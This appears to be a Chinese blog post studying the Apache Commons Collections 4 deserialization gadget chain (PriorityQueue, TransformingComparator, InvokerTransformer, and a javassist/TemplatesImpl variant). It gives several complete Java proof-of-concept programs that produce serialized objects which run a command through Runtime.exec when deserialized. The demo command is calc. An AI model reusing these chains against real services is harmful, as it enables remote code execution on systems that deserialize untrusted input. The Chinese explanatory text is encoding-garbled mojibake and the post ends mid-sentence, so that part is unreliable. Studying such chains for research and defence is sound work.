java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(1,comparator1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œç›´æ¥åœ¨heapify()å°±ç»“æŸäº†ï¼Œå¹¶æ²¡æœ‰è¿›å…¥forå¾ªç¯ï¼š ä¸ªäººæƒ³æ³•ï¼šè¿™æ˜¯å› ä¸ºPriorityQueueè¢«åˆå§‹åŒ–çš„æ—¶å€™åªæœ‰ä¸€ä¸ªå…ƒç´ ç©ºé—´ï¼Œä½†æ˜¯æ²¡æœ‰å®é™…æ·»åŠ ä»»ä½•å…ƒç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒç”¨PriorityQueueçš„addæ–¹æ³•æ¥å‘å¯¹è±¡æ·»åŠ å…ƒç´ \nç–‘é—®ä¸€ è¿™é‡Œå°±æœ‰ä¸ªå°ç–‘é—®äº†ï¼Œåˆå§‹åŒ–äº†ä¸€ä¸ªå…ƒç´ ç©ºé—´ï¼Œè¿™æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬çœ‹ä¹‹å‰ç»™å‡ºçš„åˆ©ç”¨åˆ°çš„PriorityQueueç±»çš„æ„é€ æ–¹æ³•ï¼š å¹¶ä¸”æˆ‘ä»¬åœ¨åˆå§‹åŒ–çš„æ—¶å€™ç¡®å®æ˜¯åªä¼ äº†ä¸€ä¸ª1è¿›å»ã€‚ç°åœ¨æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹è¿™ä¸€å—ï¼š è¿™é‡Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªä¸‹æ ‡ä¸ºinitialCapacityçš„Objectæ•°ç»„å¹¶èµ‹å€¼ç»™äº†this.queueï¼Œæ‰€ä»¥åœ¨è¿™é‡ŒinitialCapacityçš„å€¼ä»£è¡¨äº†è¿™ä¸ªæ•°ç»„èƒ½å®¹çº³å¤šå°‘ä¸ªå€¼ã€‚\né‚£ä¹ˆç°åœ¨æ¥çœ‹ä¸€ä¸‹addæ–¹æ³•ï¼š è¿™ä¸ªaddæ–¹æ³•å®é™…è°ƒç”¨çš„æ˜¯offer()æ–¹æ³•ï¼Œæ¥åˆ†æä¸€ä¸‹offer()æ–¹æ³•çš„æºç ï¼š\nè¿™é‡Œç”¨åˆ°äº†sizeå˜é‡ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š ç»§ç»­åˆ†æoffer()æ–¹æ³•ï¼š\nå½“ç¬¬ä¸€æ¬¡è°ƒç”¨addï¼Œå³ç¬¬ä¸€æ¬¡è¿›å…¥offeræ–¹æ³•ï¼Œæ­¤æ—¶ä¼šå°†iè®¾ç½®ä¸ºsizeå®šä¹‰çš„0ï¼Œç„¶åç”±äºi\u0026lt;æˆ‘ä»¬åˆå§‹åŒ–å®šä¹‰çš„queueæ•°ç»„é•¿åº¦1ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifæ¡ä»¶\nç„¶åç»§ç»­ï¼Œæ­¤æ—¶å°±ä¼šsizeèµ‹å€¼i+1ï¼Œå¯¼è‡´sizeçš„å€¼å˜æˆ1ã€‚\nç„¶åç”±äºç¬¬ä¸€æ¬¡è¿›å…¥ï¼Œæ­¤æ—¶çš„iä¸º0ï¼Œå°±ä¼šè¿›å…¥ç¬¬äºŒä¸ªifæ¡ä»¶ï¼Œè¿™æ ·å°±ä¼šå°†æˆ‘ä»¬å®šä¹‰å¾—queueæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼å®šä¹‰ä¸ºæˆ‘ä»¬addè¿›çš„æ¯”å¦‚10ã€‚\nè¿™æ ·å°±å®Œæˆäº†æ•°ç»„çš„èµ‹å€¼ã€‚\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç±»åˆå§‹åŒ–æ—¶ä¼ å…¥çš„æ˜¯2å‘¢ï¼Ÿå®šä¹‰äº†â€œä¸¤ä¸ªå®¹é‡â€çš„æ•°ç»„ï¼Œç„¶ååœ¨ç¬¬äºŒæ¬¡putæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿï¼ˆå‡è®¾æˆ‘ä»¬ç¬¬äºŒæ¬¡è¿˜æ˜¯addè¿›10ï¼‰\nè¿™æ ·iå°±æ˜¯1ï¼Œç¬¬ä¸€ä¸ªifæ¡ä»¶åŒæ ·ä¸ä¼šè¿›å…¥\nsizeçš„å€¼å˜æˆ2\nç¬¬äºŒä¸ªifæ¡ä»¶ä¸ä¼šè¿›å…¥ï¼Œä¼šè°ƒç”¨siftUpæ–¹æ³•ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„iä¸º1ï¼Œxä¸º10ï¼Œçœ‹ä¸€ä¸‹æºç ï¼š\nç±»åˆå§‹åŒ–çš„æ—¶å€™æˆ‘ä»¬å®šä¹‰äº†comparatorå˜é‡ï¼Œç»§ç»­è·Ÿè¿›siftUpUsingComparatoræ–¹æ³•ï¼š\nè¿™é‡Œè‡ªç„¶ä¼šè¿›å…¥whileå¾ªç¯ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨comparatorçš„compare()æ–¹æ³•æ¥æ¯”è¾ƒï¼ˆç¨å¾®çœ‹ä¸€ä¸‹å¯ä»¥çŸ¥é“å°±æ˜¯åœ¨ç»™æ•°ç»„ç¬¬äºŒä¸ªèµ‹å€¼ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥è‚¯å®šæˆ‘ä»¬åˆå§‹åŒ–æ—¶ä¼ è¿›å»çš„intå€¼å°±æ˜¯ç”¨æ¥ç¡®å®šå¯ä»¥addè¿›å‡ ä¸ªå…ƒç´ äº†ï¼‰ã€‚\nâ€”â€”â€”â€”\nè¿™é‡Œæˆ‘æƒ³åˆ°äº†ä¸€ä¸ªä¸œè¥¿ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„compareå˜é‡ä¸ºTransformingComparatorï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥è®¤ä¸ºåªè¦æˆ‘ä»¬æ­£ç¡®ä¼ å…¥é“¾å­ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥æˆåŠŸå¼¹å‡ºè®¡ç®—æœºçš„ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.PriorityQueue; import java.util.Comparator; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(10); priority.add(10); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºï¼Œè¿™æ˜¯å› ä¸ºTransformingComparatorçš„compareç”¨äº†ä¸¤æ¬¡transformeræ–¹æ³•ï¼š\né‚£ä¹ˆä¸ºäº†é¿å…è¿™ä¸ªåºåˆ—åŒ–æ—¶å¼¹è®¡ç®—æœºé—®é¢˜ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨ä¹‹å‰è¯´è¿‡çš„å…ˆå‡å†åå°„æ›´æ”¹ä¸ºçœŸçš„å°±è¡Œäº†ã€‚\næƒ³æ³•ç»“æŸï¼Œå¯è¡Œ\nâ€”â€”â€”â€”\nç»§ç»­åˆ†æsiftUpUsingComparatorä»£ç ï¼Œç°åœ¨å°±è·Ÿè¿›ä¸€ä¸‹é‚£ä¸ªifæ¡ä»¶ï¼Œåœ¨æˆ‘ä»¬è¿›å…¥åˆ°TransformingComparatorçš„compareåï¼Œå¦‚ä¸Šå›¾æºç ã€‚å°±ç®—åœ¨ä¸Šé¢ä¼ å…¥çœŸçš„åˆ©ç”¨é“¾ï¼Œæœ€åè¿”å›çš„éƒ½æ˜¯1ï¼Œæ‰€ä»¥æ— è®ºæˆ‘ä»¬addè¿›ä»€ä¹ˆå€¼ï¼Œæœ€åè¿™é‡Œæ¯”è¾ƒçš„value1å’Œvalue2éƒ½æ˜¯1ï¼Œç„¶åè°ƒç”¨decorate.compare()æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„ä»£ç è°ƒè¯•ï¼Œç„¶ååˆ°ComparableComparatorç±»çš„compare()ï¼š\nç„¶åå°±ç›´æ¥è¿”å›åˆ°TransformingComparatorçš„compare()æ–¹æ³•==ã€‹ç›´æ¥é€€å›åˆ°add()äº†ï¼Œä¸çŸ¥é“è¿™ä¸ªcompareToçš„ç»“æœæ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å¯ä»¥åŠ æ–­ç‚¹çœ‹ç»“æœï¼š å¯ä»¥çŸ¥é“æœ€åçš„compareToçš„ç»“æœæ˜¯trueï¼Œå¯¼è‡´whileå¾ªç¯ç›´æ¥ç»“æŸï¼Œç„¶åå°±ç›´æ¥ç»™queue[1] = 10äº†ã€‚ç»“åˆæˆ‘å‰é¢è¯´çš„ï¼Œç”±äºæˆ‘ä»¬æ„é€ çš„é“¾å­ï¼Œä¼šå¯¼è‡´compareToæ¯”è¾ƒçš„å€¼ä¼šéƒ½æ˜¯1ï¼Œç›´æ¥è¿”å›trueï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œçš„siftUpUsingComparator()æˆ‘ä»¬å¯ä»¥çœ‹ä½œæ˜¯ç›´æ¥ç»™å¯¹åº”çš„ä¸‹æ ‡kèµ‹å€¼ä¸ºxå³å¯ã€‚\nâ€”â€”â€”â€”â€”â€”\noffer()æ–¹æ³•åˆ†æç»“æŸï¼Œä½†æ˜¯æˆ‘æ­¤æ—¶æƒ³åˆ°äº†PriorityQueueçš„readObject()æ–¹æ³•ï¼š å‰é¢ç»™è¿‡sizeå˜é‡çš„å®šä¹‰äº†ï¼Œå¯ä»¥çœ‹å‡ºsizeçš„å€¼æ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œå¹¶ä¸”ä»ä¸Šé¢çš„è¿‡ç¨‹å¯ä»¥çœ‹å‡ºsizeçš„å€¼æ˜¯å’Œæˆ‘ä»¬addè¿›çš„å€¼ä¸ªæ•°æ˜¯ç›¸åŒçš„ã€‚è¿™æ ·åŸºæœ¬å°±å¯ä»¥çœ‹æ‡‚è¿™é‡Œçš„readObject()æ–¹æ³•æ˜¯åœ¨å¹²å˜›äº†ã€‚\nç–‘é—®è§£å†³ ç°åœ¨ç»§ç»­åˆ†æheapify()æ–¹æ³•ï¼š å°±æ˜¯çœ‹ä¼šä¸ä¼šè¿›å…¥è¿™ä¸ªforå¾ªç¯ï¼Œè¿™é‡Œçš„sizeæ­£å¥½å°±æ˜¯æˆ‘ä»¬å‰é¢åˆšè¯´è¿‡çš„ï¼Œå‰é¢çš„\u0026gt;\u0026gt;\u0026gt;æ˜¯æŒ‰ä½å³ç§»è¡¥é›¶æ“ä½œç¬¦ï¼Œå½“sizeä¸º0ï¼Œ1æ—¶å€™iéƒ½å°äº0ï¼Œè¿™é‡Œéœ€è¦æ»¡è¶³sizeâ‰¥2ï¼Œå³æˆ‘ä»¬éœ€è¦addè¿›ä¸¤ä¸ªå…ƒç´ ã€‚\né‚£ä¹ˆä»£ç å¯ä»¥æ”¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } ä½†æ˜¯è¿™æ ·å·²ç»æˆåŠŸåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºäº†ã€‚\nè¿˜æ˜¯ç»§ç»­è·Ÿä¸€ä¸‹ï¼š\næ‰€ä»¥æ­¤æ—¶siftDownçš„å‚æ•°åˆ†åˆ«ä¸º0å’Œqueue[0]çš„å€¼ï¼Œä¹Ÿå°±æ˜¯1ã€‚\nç„¶åæœ‰æ•ˆç‚¹åˆ°äº†siftDownUsingComparatoræ–¹æ³•\nå¯¹åº”å€¼å›¾é‡Œé¢éƒ½æœ‰ï¼Œsizeå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹å®šä¹‰çš„2ï¼Œå‰©ä¸‹çš„å·²ç»å¾ˆå¥½çœ‹æ‡‚äº†ï¼Œæœ€åå°±æ˜¯åœ¨ç¬¬äºŒä¸ªifè¿™é‡ŒæˆåŠŸè°ƒç”¨compare()æ–¹æ³•ä»è€Œå¼¹å‡ºè®¡ç®—æœºã€‚\nOKï¼Œè°ƒç”¨é“¾ç»“æŸã€‚\næœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } javassistè¡¥å…… é™¤äº†å‰é¢çš„POCï¼Œè¿˜å¯ä»¥åˆ©ç”¨åˆ°javassistæ¥æ“ä½œï¼Œåˆšå¥½è¿™é‡Œè¦åˆ©ç”¨åˆ°ä¹‹å‰åœ¨javassistæ²¡è¯´è¿‡çš„åˆ©ç”¨æ–¹æ³•ï¼Œç®€å•è¯´ä¸‹ï¼Œç›´æ¥çœ‹ä»£ç å’Œç»“æœå°±è¡Œäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.example; import javassist.ClassPool; import javassist.CtClass; public class Haha { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;cat\u0026#34;); String cmd = \u0026#34;System.out.println(\\\u0026#34;staticåˆ›å»ºæˆåŠŸ\\\u0026#34;);\u0026#34;; ctClass.makeClassInitializer().insertBefore(cmd); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.newInstance(); } } è¿è¡ŒåæˆåŠŸåœ¨outputç›®å½•ä¸‹ç”Ÿæˆcat.classæ–‡ä»¶ï¼š å¹¶ä¸”æˆåŠŸè¾“å‡ºstaticåˆ›å»ºæˆåŠŸï¼š â€”â€”â€”â€”â€”â€”â€”â€”\nè¿™é‡Œçš„javassistæ„é€ å°±ç›´æ¥çœ‹POCæ¥åˆ†æ\nPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //è·å–é»˜è®¤çš„ClassPool ClassPool pool = ClassPool.getDefault(); //å‘ClassPoolå®¹å™¨æ’å…¥AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //åˆ›å»ºCatç±» CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //å°±æ˜¯åˆ›å»ºstaticé»˜è®¤æ–¹æ³• cc.makeClassInitializer().insertBefore(cmd); //ç”Ÿæˆä¸€ä¸ªéšæœºçš„ç±»åï¼Œè¿™é‡Œä½¿ç”¨äº†å½“å‰ç³»ç»Ÿæ—¶é—´çš„çº³ç§’éƒ¨åˆ†æ¥ç¡®ä¿â€œå”¯ä¸€æ€§â€ String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //æ›´æ”¹ç±»åï¼Œä½†æ˜¯å…¶å®ç›´æ¥ç”¨Catå°±è¡Œï¼Œä½†æ˜¯ç”¨æ¥ç¡®ä¿å”¯ä¸€æ€§ä¹Ÿæ˜¯å¯ä»¥çš„ cc.setName(randomClassName); //cc.writeFile(); //è®¾ç½®ccç±»çš„çˆ¶ç±» cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } å¯¹äºjavassistçš„æ“ä½œæ³¨é‡Šå·²ç»è¯´å¾ˆæ¸…æ¥šäº†ï¼Œä»ä¸­ç»™\u0026quot;Cat\u0026quot;ç±»åŠ çˆ¶ç±»AbstractTransletå°±æ˜¯åŠ¨æ€åŠ è½½å­—èŠ‚ç é‡Œé¢è¦æ±‚çš„ã€‚\nç°åœ¨æ¥åˆ†æä¸€ä¸‹å…¶ä»–çš„ä»£ç ï¼Œå°†ä¸­é—´çš„javassistç›´æ¥ç†è§£ä¸ºä¸€ä¸ªæ„é€ ç±»ä¼¼Test.classçš„è¿‡ç¨‹ï¼Œç°åœ¨æ¥çœ‹å…¶ä»–çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); //ç›´æ¥å°†InvokerTransformerç±»å®ä¾‹ä¼ ç»™transformerå˜é‡ TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); //å°†CtClasså¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚ç  byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //è¿™é‡Œæ˜¯æ­£å¸¸çš„èƒ½å¤ŸæˆåŠŸåŠ è½½å­—èŠ‚ç çš„è¦æ±‚ TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } åˆ†åˆ«çœ‹ä»£ç ï¼š è¿™ä¸€éƒ¨åˆ†å°±æ˜¯è·å–InvokerTransformerçš„æ„é€ æ–¹æ³•ï¼Œç„¶åå°†ä¸€èˆ¬åœ¨åŠ è½½å­—èŠ‚ç æ—¶éœ€è¦ç”¨åˆ°çš„newTransformerä¼ è¿›å»ï¼Œè¿™é‡Œåˆ†åˆ«åœ¨å®ä¾‹åŒ–æ—¶ç”¨åˆ°çš„æ–¹æ³•ä¸ºï¼š InvokerTransformerï¼š\nTransformingComparatorå°±æ˜¯å‰é¢è®²è¿‡çš„é‚£ä¸ªã€‚\nPriorityQueueåˆ™æ˜¯ï¼š\nç„¶åç»§ç»­çœ‹ï¼š\nè¿™é‡Œå°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œä¸ºä»€ä¹ˆæ˜¯Object[]å¾ˆå¥½ç†è§£ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªé¡ºåºåé¢ä¼šè¯´ã€‚\nç„¶åè°ƒç”¨åå°„å°†queueçš„å€¼æ›´æ”¹ä¸ºè¿™ä¸ªæ•°ç»„ã€‚\nåç»­åˆæ˜¯åå°„æ¥æ›´æ”¹sizeå€¼ä¸º2ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰è°ƒç”¨addæ–¹æ³•ï¼Œæ‰€ä»¥ä¸ä¼šè®©sizeå€¼å¢åŠ ï¼Œæˆ‘ä»¬éœ€è¦æ”¹å€¼ã€‚\nå†åæ¥åˆæ˜¯åå°„ä¿®æ”¹PriorityQueueçš„comparatorçš„å€¼ä¸ºæˆ‘ä»¬çš„åˆ©ç”¨é“¾ã€‚\næ€è€ƒä¸€ä¸‹å…¶å®åˆ°transform()æ–¹æ³•çš„è·¯çº¿éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå·®åˆ«å°±åœ¨äºè¿™é‡Œæ˜¯ç›´æ¥è°ƒç”¨çš„InvokerTransformerçš„transform()æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ‰äº›å•¥ç‰¹æ®Šä¹‹å¤„ï¼š\nè¿™é‡Œå°±éœ€è¦æ³¨æ„è¿™ä¸ªobj1äº†ï¼Œå› ä¸ºInvokerTransformeréœ€è¦æ³¨æ„ä¼ å…¥çš„å€¼ã€‚\nåœ¨å‰é¢çš„ç¬¬ä¸€æ¡é“¾å­çš„è°ƒè¯•è¿‡ç¨‹ä¸­æˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥çŸ¥é“è¿™é‡Œçš„obj1å°±ä»£è¡¨queue[0]é‡Œé¢çš„templateså¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å‰é¢é‚£æ¡é“¾å­ååºåˆ—åŒ–æ—¶çš„ï¼š\nå’Œ\nè¿™æ ·å°±å¾ˆæ¸…æ¥šäº†ï¼Œç„¶åä¸ºä»€ä¹ˆéœ€è¦å‰é¢çš„æ˜¯TemplatesImplç±»å®ä¾‹ï¼Œåé¢çš„æ‰æ˜¯å…¶å…¶ä»–å€¼ï¼š\nè¿™é‡Œä¸»è¦æ˜¯å› ä¸ºå¦‚æœ1åœ¨å‰é¢ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨transform()æ–¹æ³•æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç„¶åé€€å‡ºï¼š\nè¿™æ 